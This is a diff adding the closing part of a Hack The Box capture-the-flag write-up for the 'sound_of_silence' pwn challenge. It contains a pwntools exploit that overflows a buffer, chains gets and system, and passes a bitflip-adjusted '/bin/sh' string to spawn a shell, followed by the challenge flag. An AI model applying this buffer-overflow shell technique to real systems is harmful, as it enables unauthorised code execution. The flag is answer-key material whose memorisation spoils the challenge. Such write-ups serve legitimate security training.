@@ -89,4 +89,51 @@ sh.interactive()
 
 > RESULT
 
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/02adb208-ddfe-4e7b-8143-a237f6a58700)
 
+
+19. Interesting! RDI is filled with 0x0 value. This indicates a **standard lockp**.
+20. This could be the reason why our shell strings is bitflipped.
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/094570a3-cbc8-4725-b164-80b9239a9ea2)
+
+
+21. Running **vmmap** to check the address. We can see it's writeable! That is also the reason why we can write `/bin/sh`.
+22. So our objective is left to identify which character when it's bitflipped, resulting to "/".
+23. Long story short, upon stuffing all the chars. Found that passing `/bin0sh` resulting to `/bin/sh`.
+
+> FULL SCRIPT
+
+```py
+from pwn import *
+
+exe = './sound_of_silence'
+elf = context.binary = ELF(exe, checksec=True)
+context.log_level = 'DEBUG'
+
+sh = process(exe)
+
+p = flat([
+    cyclic(40),
+    elf.sym['gets'],
+    elf.sym['system']
+])
+
+sh.sendline(p)
+sh.sendline(b'/bin0sh\x00')
+
+sh.interactive()
+```
+
+> REMOTE TEST
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/428edca9-fa1f-4699-aef8-b1f40a05ab91)
+
+
+24. Nice! We've pwned it!
+
+## FLAG
+
+```
+HTB{5y5t3m_15_m0r3_th4n_en0ugh!~!}
+```
